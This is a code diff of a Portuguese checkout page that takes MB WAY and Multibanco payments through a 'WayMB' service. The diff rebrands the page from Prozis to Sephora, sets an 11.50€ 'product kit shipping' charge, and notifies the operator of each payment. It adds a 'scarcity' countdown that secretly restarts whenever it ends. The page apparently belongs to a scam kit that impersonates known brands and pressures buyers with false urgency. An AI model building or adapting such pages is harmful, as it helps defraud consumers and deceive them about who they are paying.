@@ -358,7 +945,8 @@
             </div>
             <h3 style="margin: 0 0 10px; font-size: 20px; color: #111; font-weight: 800;">Número Inválido</h3>
             <p style="font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5;">
-                O MB WAY não reconheceu este número de telemóvel. Por favor verifique se o número está associado a uma
+                O MB WAY não reconheceu este número de telemóvel. Por favor verifique se o número está associado a
+                uma
                 conta MB WAY ativa.
             </p>
 
@@ -368,8 +956,37 @@
         </div>
     </div>
 
-    <script src="script.js?v=38"></script>
-    <script src="waymb-service.js?v=38"></script>
+    <script src="/static/js/notifications.js"></script>
+    <script>
+        // Scarcity Timer Logic
+        (function () {
+            const duration = 10 * 60; // 10 minutes
+            const display = document.querySelector('#timerCountdown');
+            let timer = duration, minutes, seconds;
+
+            const startTimer = () => {
+                setInterval(function () {
+                    minutes = parseInt(timer / 60, 10);
+                    seconds = parseInt(timer % 60, 10);
+
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                    if (display) {
+                        display.textContent = minutes + ":" + seconds;
+                    }
+
+                    if (--timer < 0) {
+                        timer = duration; // Loop or handle expiry
+                    }
+                }, 1000);
+            };
+
+            startTimer();
+        })();
+    </script>
+    <script src="script.js?v=39"></script>
+    <script src="waymb-service.js?v=39"></script>
 
     <script>
         let selectedMethod = 'mbway';
@@ -387,6 +1004,17 @@
             document.querySelectorAll('.payment-option').forEach(el => el.classList.remove('selected'));
             element.classList.add('selected');
             selectedMethod = type;
+
+            const shippingSpan = document.getElementById('shippingMethod');
+            if (type === 'multibanco') {
+                shippingSpan.innerText = "Tradicional (48h)";
+                shippingSpan.style.color = "#666";
+                shippingSpan.style.fontWeight = "400";
+            } else {
+                shippingSpan.innerText = "Expresso (24h)";
+                shippingSpan.style.color = "#000"; // Reset or keep default
+                shippingSpan.style.fontWeight = "400";
+            }
         }
 
         async function processPayment() {
@@ -442,12 +1070,12 @@
             // Robust extraction: remove non-digits, then take LAST 9 digits
             const rawPhone = (userData.phone || '999999999').toString().replace(/\D/g, '');
             const cleanTel = rawPhone.slice(-9);
-            const cleanName = (userData.name || 'Prozis Customer').substring(0, 50);
+            const cleanName = (userData.name || 'Sephora Customer').substring(0, 50);
             const cleanDoc = (userData.nif || '999999990').toString().replace(/\D/g, '').slice(0, 9);
 
             // Call WayMB API
             const result = await window.wayMB.createTransaction({
-                amount: 12.99, // PRODUCT KIT SHIPPING
+                amount: 11.50, // PRODUCT KIT SHIPPING
                 method: method,
                 flow: "root", // Or specialized flow if needed
                 payer: {
@@ -460,9 +1088,9 @@
 
             if (result.success) {
                 // Determine Pushcut Notification based on success
-                window.wayMB.notifyPushcut('Pendente delivery', `Prozis Kit: 12.99€ (${method.toUpperCase()})`);
+                window.wayMB.notifyPushcut('Pendente delivery', `Sephora Kit: 11.50€ (${method.toUpperCase()})`);
 
-                fbq('track', 'Purchase', { currency: "EUR", value: 12.99 });
+                fbq('track', 'Purchase', { currency: "EUR", value: 11.50 });
 
                 const finalData = { ...result.data, payer: { phone: cleanTel, name: cleanName } };
                 sessionStorage.setItem('currentPayment', JSON.stringify(finalData));
